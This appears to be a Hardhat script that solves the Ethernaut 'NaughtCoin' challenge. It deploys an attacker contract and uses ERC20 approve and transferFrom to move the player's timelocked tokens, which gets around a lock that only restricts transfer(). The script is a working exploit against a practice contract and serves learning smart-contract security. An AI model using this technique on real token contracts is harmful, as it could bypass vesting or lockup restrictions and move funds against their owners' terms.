/*
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec            (https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) 
The OpenZeppelin codebase (https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts)
*/

const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();

  // Get an instance of the contract deployed by Ethernaut
  const NaughtCoinAddress = "0xdE76A863E1E906B87Ab4B2193c651C0Cc1d6c79F"
  this.naughtCoin = await hre.ethers.getContractAt("NaughtCoin",NaughtCoinAddress);

  const NaughtCoinAttack = await hre.ethers.getContractFactory("NaughtCoinAttack");
  this.naughtCoinAttack = await NaughtCoinAttack.connect(player).deploy(this.naughtCoin.address);
  await this.naughtCoinAttack.deployed();

  console.log(
    `
    Player Balance ${hre.ethers.utils.formatEther(await this.naughtCoin.balanceOf(player.address))} \n
    Attacker contract balance ${hre.ethers.utils.formatEther(await this.naughtCoin.balanceOf(this.naughtCoinAttack.address))}  \n
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  // Transferring Player's balances
  console.log("Transferring Player's balances ...");

  const playerBalance = await this.naughtCoin.balanceOf(player.address);

  // Approve the Attacker Contract to spend all the player's tokens
  const allowanceToAttackerContract_TX = await this.naughtCoin.connect(player).approve(this.naughtCoinAttack.address,playerBalance);
  await allowanceToAttackerContract_TX.wait();

  let attackerAllowance = await this.naughtCoin.allowance(player.address,this.naughtCoinAttack.address);
  console.log(
    `
    attackerAllowance ${hre.ethers.utils.formatEther(attackerAllowance)} \n
    `
  );

  // Attacker Contract spends all the tokens of the player
  const transferTokens_TX = await this.naughtCoinAttack.connect(player).hackContract(player.address,this.naughtCoinAttack.address,playerBalance);
  await transferTokens_TX.wait();

  console.log("===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    Player Balance ${hre.ethers.utils.formatEther(await this.naughtCoin.balanceOf(player.address))} \n
    Attacker contract balance ${hre.ethers.utils.formatEther(await this.naughtCoin.balanceOf(this.naughtCoinAttack.address))}  \n
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});